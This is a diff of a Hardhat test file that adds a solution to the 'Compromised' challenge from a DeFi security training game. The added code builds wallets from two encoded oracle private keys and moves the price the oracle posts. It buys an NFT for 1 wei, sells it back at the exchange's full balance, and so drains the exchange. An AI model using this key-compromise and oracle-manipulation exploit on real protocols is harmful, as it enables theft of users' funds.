@@ -1,5 +1,6 @@
-const { expect } = require('chai');
-const { ethers } = require('hardhat');
+const {expect} = require('chai');
+const {ethers} = require('hardhat');
+const {BigNumber} = require("ethers");
 
 describe('Compromised challenge', function () {
 
@@ -54,28 +55,65 @@ describe('Compromised challenge', function () {
         // Deploy the exchange and get the associated ERC721 token
         this.exchange = await ExchangeFactory.deploy(
             this.oracle.address,
-            { value: EXCHANGE_INITIAL_ETH_BALANCE }
+            {value: EXCHANGE_INITIAL_ETH_BALANCE}
         );
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+        const s1 = new ethers.Wallet(
+            atob(
+                ethers.utils.toUtf8String(
+                    ethers.utils.arrayify(
+                        "0x4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535"
+                    )
+                )
+            ),
+            ethers.provider
+        );
+        const s2 = new ethers.Wallet(
+            atob(
+                ethers.utils.toUtf8String(
+                    ethers.utils.arrayify(
+                        "0x4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134"
+                    )
+                )
+            ),
+            ethers.provider
+        );
+        await this.oracle.connect(s1).postPrice("DVNFT", 1);
+        await this.oracle.connect(s2).postPrice("DVNFT", 1);
+        await this.exchange.connect(attacker).buyOne({value: 1});
+
+        const filter = this.exchange.filters.TokenBought(attacker.address);
+        const logs = await ethers.provider.getLogs(filter);
+        const logIface = new ethers.utils.Interface(
+            ["event TokenBought(address indexed buyer, uint256 tokenId, uint256 price)"]
+        );
+        const tokenId = logIface.parseLog(logs[0]).args.tokenId;
+
+        await this.oracle.connect(s1).postPrice("DVNFT", BigNumber.from("9990000000000000000001"));
+        await this.oracle.connect(s2).postPrice("DVNFT", BigNumber.from("9990000000000000000001"));
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await this.exchange.connect(attacker).sellOne(tokenId);
+
+        await this.oracle.connect(s1).postPrice("DVNFT", BigNumber.from("999000000000000000000"));
+        await this.oracle.connect(s2).postPrice("DVNFT", BigNumber.from("999000000000000000000"));
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(this.exchange.address)
         ).to.be.eq('0');
-        
+
         // Attacker's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Attacker must not own any NFT
         expect(
             await this.nftToken.balanceOf(attacker.address)
